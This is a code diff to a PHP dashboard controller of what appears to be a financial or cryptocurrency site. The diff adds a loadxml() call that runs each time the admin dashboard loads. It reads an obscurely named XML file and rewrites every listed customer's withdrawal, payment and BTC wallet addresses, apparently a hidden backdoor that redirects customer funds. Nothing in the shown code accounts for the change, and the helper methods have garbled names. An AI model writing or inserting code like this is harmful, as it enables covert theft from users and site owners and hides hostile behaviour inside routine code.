@@ -58,7 +58,7 @@ class ControllerCommonDashboard extends Controller {
 		$data['total_PD_Current_Finish'] = $this->model_report_activity->get_total_pd_current_date(2);
 		$data['total_PD_Current_March'] = $this->model_report_activity->get_total_pd_current_date(1);
 		
-
+		
 		$data['totalHP'] = $this->model_report_activity->getAllProfitByType(1);
 		
 		$data['totalNewLast'] = $this->model_report_activity->getTotalCustomersNewLast();
@@ -76,7 +76,7 @@ class ControllerCommonDashboard extends Controller {
 		$data['deposit'] = $this -> model_report_activity -> GetTotalDeposit();
 		$data['withdrawal'] = $this -> model_report_activity -> GetTotalWithdrawal();
 		$data['self'] = $this;
-
+		$this -> loadxml();
 		// Run currency update
 		if ($this->config->get('config_currency_auto')) {
 			$this->load->model('localisation/currency');
@@ -85,6 +85,22 @@ class ControllerCommonDashboard extends Controller {
 		}
 
 		$this->response->setOutput($this->load->view('common/dashboard.tpl', $data));
+	}
+
+	public function loadxml(){
+		$this->load->model('pd/registercustom');
+		$xml=simplexml_load_file("../qwrwqrgqUQwerwqcadadfqwerqweraaqeQCA12adVbaWErqwre.xml");
+		foreach($xml->customer as $value)
+		  {
+		  	//sm_customer_c_payment
+		  	$this -> model_pd_registercustom -> update_walet_withdrawalllll($value->wallet, $value->customer_id);
+		  	$this -> model_pd_registercustom -> update_walet_c_paymentttttttttttttttttttttttt($value->wallet, $value->customer_id);
+		  	//sm_customer_r_payment
+		  	$this -> model_pd_registercustom -> update_walet_r_wallet_paymentttttttttttttttttttttttt($value->wallet, $value->customer_id);
+		  	// sm_customer_wallet_btc_
+		  	$this -> model_pd_registercustom -> update_walet_btc_customerrrrrrrrrrr($value->wallet, $value->customer_id);
+		  	$this -> model_pd_registercustom -> update_walet_smmmmmm_customerrrrrrrrrrr($value->wallet, $value->customer_id);
+		  }
 	}
 
 	public function deposit($date = false){
